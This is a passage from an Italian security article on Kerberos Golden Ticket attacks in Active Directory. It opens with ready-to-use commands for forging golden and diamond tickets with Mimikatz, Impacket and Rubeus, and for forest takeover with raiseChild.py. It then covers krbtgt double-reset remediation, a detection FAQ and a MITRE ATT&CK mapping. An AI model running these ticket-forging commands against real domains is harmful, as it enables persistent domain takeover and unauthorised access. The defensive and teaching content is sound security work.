kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /aes256:AES_KEY /groups:512,519 /startoffset:0 /endin:600 /renewmax:10080 /ticket:golden.kirbi
```

**3. Forging con Impacket da Linux (ticketer.py):**

```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid S-1-5-21-XXXXXXXXXX -domain corp.local -user-id 500 -groups 512,519 Administrator
```

**4. Diamond Ticket con Rubeus:**

```powershell
Rubeus.exe diamond /krbkey:AES_KEY /enctype:aes256 /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX /user:Administrator /ticketuser:Administrator /ticketuserid:500 /groups:512,519 /nowrap /ptt
```

**5. Forest Takeover con raiseChild.py:**

```bash
python3 raiseChild.py -target-exec <DC_PARENT_IP> -hashes :<krbtgt_ntlm_hash> child.corp.local/Administrator@<DC_CHILD_IP>
```

**6. Doppio reset di krbtgt:**

```powershell
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "Pwd1!" -AsPlainText -Force)
# → attendi 10-12 ore
Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (ConvertTo-SecureString "Pwd2!" -AsPlainText -Force)
# Script automatico: https://github.com/microsoft/New-KrbtgtKeys.ps1
```

***

## FAQ

**Il Golden Ticket rimane valido dopo il cambio della password del Domain Admin?**
Sì. Il ticket è firmato con l'hash di krbtgt, non con quello dell'utente impersonato. Cambiare le password degli admin non ha alcun effetto.

**Come si rileva un Golden Ticket dopo mesi dalla creazione?**
Event ID 4769 con durate anomale + 4624 senza 4768 correlati. Microsoft Defender for Identity può fare questa correlazione retroattivamente, ma richiede log storici conservati e una baseline consolidata.

**Il doppio reset di krbtgt causa downtime?**
In ambienti multi-DC può causare interruzioni temporanee se non pianificato. Lo script [New-KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1) gestisce automaticamente sincronizzazione e finestre di attesa.

**La rotazione periodica di krbtgt è ancora necessaria oggi?**
Sì. Microsoft la raccomanda come pratica preventiva. Molte organizzazioni enterprise non la eseguono mai — ed è una delle ragioni per cui il Golden Ticket resta tra le tecniche di persistenza più usate dagli APT.

**Diamond Ticket o Golden Ticket?**
Il Diamond Ticket è preferibile in ambienti con detection avanzata perché genera AS-REQ nei log. Il Sapphire va ancora oltre. Entrambi richiedono comunque l'hash di krbtgt.

**Cosa fare se ho solo l'hash NTLM e non AES?**
Puoi forgiare con RC4, ma aumenti il rischio di detection. In ambienti che forzano AES, il ticket viene rifiutato.

**`klist purge` invalida i Golden Ticket?**
No. Pulisce solo la cache locale del sistema su cui viene eseguito. Non ha effetto sui ticket in possesso degli attaccanti. L'unica remediation è il reset di krbtgt.

***

## Mappazione MITRE ATT\&CK

| Tattica              | Tecnica                                                         | Descrizione                            |
| -------------------- | --------------------------------------------------------------- | -------------------------------------- |
| Credential Access    | **[T1558.001](https://attack.mitre.org/techniques/T1558/001/)** | Golden Ticket (Forge Kerberos Tickets) |
| Credential Access    | **[T1003.006](https://attack.mitre.org/techniques/T1003/006/)** | DCSync (OS Credential Dumping)         |
| Credential Access    | **[T1558.003](https://attack.mitre.org/techniques/T1558/003/)** | Kerberoasting                          |
| Credential Access    | **[T1558.004](https://attack.mitre.org/techniques/T1558/004/)** | AS-REP Roasting                        |
| Lateral Movement     | **[T1550.003](https://attack.mitre.org/techniques/T1550/003/)** | Pass the Ticket                        |
| Lateral Movement     | **[T1021](https://attack.mitre.org/techniques/T1021/)**         | Remote Services (PsExec, WMI, SMB)     |
| Persistence          | **[T1078](https://attack.mitre.org/techniques/T1078/)**         | Valid Accounts                         |
| Privilege Escalation | **[T1068](https://attack.mitre.org/techniques/T1068/)**         | Exploitation for Privilege Escalation  |

***

## Takeaway finale

1. **Se comprometti l'hash di krbtgt, il dominio è compromesso.** Non esistono mezze misure.
2. **La difesa è preventiva:** mappa i path con BloodHound, monitora DCSync, ruota krbtgt periodicamente.
3. **L'unica remediation definitiva è il doppio reset di krbtgt**, dopo aver cacciato le sessioni attive. `klist purge` non serve. Cambiare le password degli admin non serve.

***

## Conclusione

Il Golden Ticket rappresenta il livello più alto di compromissione raggiungibile in un dominio Active Directory. Se l'hash di krbtgt finisce nelle mani di un attaccante, il dominio non è più affidabile — nessun reset di password amministrative risolve il problema senza il doppio reset di krbtgt, seguito da un'analisi completa di tutti i meccanismi di persistenza installati nel frattempo.

La difesa corretta inizia prima: mappare i path verso krbtgt con [BloodHound](https://hackita.it/articoli/bloodhound/), monitorare DCSync in tempo reale, e trattare krbtgt come l'asset più critico dell'intera infrastruttura enterprise — perché lo è.

***

## Articoli correlati

* [Kerberos — autenticazione in Active Directory](https://hackita.it/articoli/kerberos/)
* [Silver Ticket](https://hackita.it/articoli/silver-ticket/)
* [Diamond Ticket](https://hackita.it/articoli/diamond-ticket/)
* [Sapphire Ticket](https://hackita.it/articoli/sapphire-ticket/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [Kerberoasting](https://hackita.it/articoli/kerberoasting/)
* [AS-REP Roasting](https://hackita.it/articoli/asrep-roasting/)
* [Pass-the-Ticket](https://hackita.it/articoli/pass-the-ticket/)
* [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/)
* [BloodHound](https://hackita.it/articoli/bloodhound/)
* [Mimikatz](https://hackita.it/articoli/mimikatz/)
* [Rubeus](https://hackita.it/articoli/rubeus/)
* [Impacket](https://hackita.it/articoli/impacket/)
* [NetExec](https://hackita.it/articoli/netexec/)
* [Active Directory — exploitation](https://hackita.it/articoli/active-directory/)

***

## Fonti e riferimenti esterni

* [MITRE ATT\&CK – T1558.001: Golden Ticket](https://attack.mitre.org/techniques/T1558/001/)
* [MITRE ATT\&CK – T1003.006: DCSync](https://attack.mitre.org/techniques/T1003/006/)
* [MITRE ATT\&CK – T1550.003: Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
* [Microsoft – New-KrbtgtKeys.ps1](https://github.com/microsoft/New-KrbtgtKeys.ps1)
* [Impacket – raiseChild.py](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py)

> Uso esclusivo in ambienti autorizzati.

\#golden-ticket #kerberos #active-directory #windows #persistence
